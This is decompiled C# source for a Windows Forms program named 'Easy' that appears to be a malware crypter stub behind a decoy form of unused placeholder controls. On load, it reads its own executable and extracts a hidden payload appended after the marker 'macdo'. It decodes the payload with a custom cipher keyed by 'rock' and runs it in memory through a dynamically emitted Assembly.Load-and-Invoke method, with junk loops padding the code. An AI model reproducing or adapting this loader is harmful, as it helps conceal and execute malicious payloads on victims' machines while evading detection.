using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class Easy : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("MaskedTextBox1")]
	private MaskedTextBox _MaskedTextBox1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon notifyIcon_0;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	public string string_0;

	public byte[] byte_0;

	public Assembly assembly_0;

	public Type type_0;

	public object object_0;

	public string string_1;

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual MaskedTextBox MaskedTextBox1
	{
		get
		{
			return _MaskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MaskedTextBox1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual NotifyIcon NotifyIcon_0
	{
		get
		{
			return notifyIcon_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			notifyIcon_0 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	public Easy()
	{
		((Form)this).add_Load((EventHandler)Easy_Load);
		string_1 = Assembly.GetExecutingAssembly().Location;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		icontainer_0 = new Container();
		CheckBox1 = new CheckBox();
		Button1 = new Button();
		ComboBox1 = new ComboBox();
		Label1 = new Label();
		LinkLabel1 = new LinkLabel();
		MaskedTextBox1 = new MaskedTextBox();
		ListView1 = new ListView();
		NotifyIcon_0 = new NotifyIcon(icontainer_0);
		RadioButton1 = new RadioButton();
		ProgressBar1 = new ProgressBar();
		NumericUpDown1 = new NumericUpDown();
		TextBox1 = new TextBox();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		Point location = new Point(119, 28);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		Size size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(0);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Button button = Button1;
		location = new Point(124, 92);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(43, 44);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(8, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(33, 133);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Label1");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(144, 178);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(4);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		MaskedTextBox maskedTextBox = MaskedTextBox1;
		location = new Point(176, 139);
		((Control)maskedTextBox).set_Location(location);
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		MaskedTextBox maskedTextBox2 = MaskedTextBox1;
		size = new Size(100, 20);
		((Control)maskedTextBox2).set_Size(size);
		((Control)MaskedTextBox1).set_TabIndex(5);
		ListView listView = ListView1;
		location = new Point(12, 149);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(6);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		NotifyIcon_0.set_Text("NotifyIcon1");
		NotifyIcon_0.set_Visible(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(158, 194);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(7);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(12, 81);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(8);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(158, 66);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(9);
		TextBox textBox = TextBox1;
		location = new Point(12, 12);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(10);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).set_Name("Easy");
		((Form)this).set_Text("Easy");
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private object method_0(byte[] byte_1, object[] object_1, string string_2, string string_3)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("ExecBytes", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		}, typeof(object));
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4] { byte_1, object_1, string_2, string_3 });
	}

	public static byte[] smethod_0(byte[] byte_1, string string_2)
	{
		int num = 0;
		int i = 0;
		checked
		{
			for (int length = string_2.Length; i < length; i++)
			{
				char c = string_2[i];
				num += Strings.Asc(c);
			}
			int num2 = byte_1.Length - 2;
			for (int j = 0; j <= num2; j += 2)
			{
				int num3 = byte_1[j];
				int num4 = byte_1[j + 1];
				int num5 = 2 * num4 - num - num3;
				int num6 = num - num3 + num4;
				byte_1[j] = (byte)unchecked(checked(unchecked(num6 % -256) + 256) % 256);
				byte_1[j + 1] = (byte)unchecked(checked(unchecked(num5 % -256) + 256) % 256);
			}
			return byte_1;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Easy_Load(object sender, EventArgs e)
	{
		method_4();
		int num = 476308;
		checked
		{
			do
			{
				Application.DoEvents();
				num++;
			}
			while (num <= 476313);
			int num2 = 1069948;
			do
			{
				Application.DoEvents();
				num2++;
			}
			while (num2 <= 1069953);
			int num3 = 1643687;
			do
			{
				Application.DoEvents();
				num3++;
			}
			while (num3 <= 1643692);
			method_0(byte_0, new object[1] { Application.get_ExecutablePath() }, "X.X", "X");
			int num4 = 2136227;
			do
			{
				Application.DoEvents();
				num4++;
			}
			while (num4 <= 2136232);
			int num5 = 7457472;
			do
			{
				Application.DoEvents();
				num5++;
			}
			while (num5 <= 7457477);
			ProjectData.EndApp();
		}
	}

	public string[] method_1(string string_2, string string_3)
	{
		return Strings.Split(string_2, string_3, -1, (CompareMethod)0);
	}

	public string method_2(byte[] byte_1)
	{
		return Encoding.Default.GetString(byte_1);
	}

	public byte[] method_3(string string_2)
	{
		return Encoding.Default.GetBytes(string_2);
	}

	public object method_4()
	{
		byte[] byte_ = File.ReadAllBytes(string_1);
		int num = 8656433;
		checked
		{
			do
			{
				Application.DoEvents();
				num++;
			}
			while (num <= 8656438);
			string_0 = method_1(method_2(byte_), "macdo")[1];
			int num2 = 3978688;
			do
			{
				Application.DoEvents();
				num2++;
			}
			while (num2 <= 3978693);
			byte_0 = smethod_0(method_3(string_0), "rock");
			int num3 = 3561328;
			do
			{
				Application.DoEvents();
				num3++;
			}
			while (num3 <= 3561333);
			int num4 = 4054968;
			do
			{
				Application.DoEvents();
				num4++;
			}
			while (num4 <= 4054973);
			object result = default(object);
			return result;
		}
	}
}
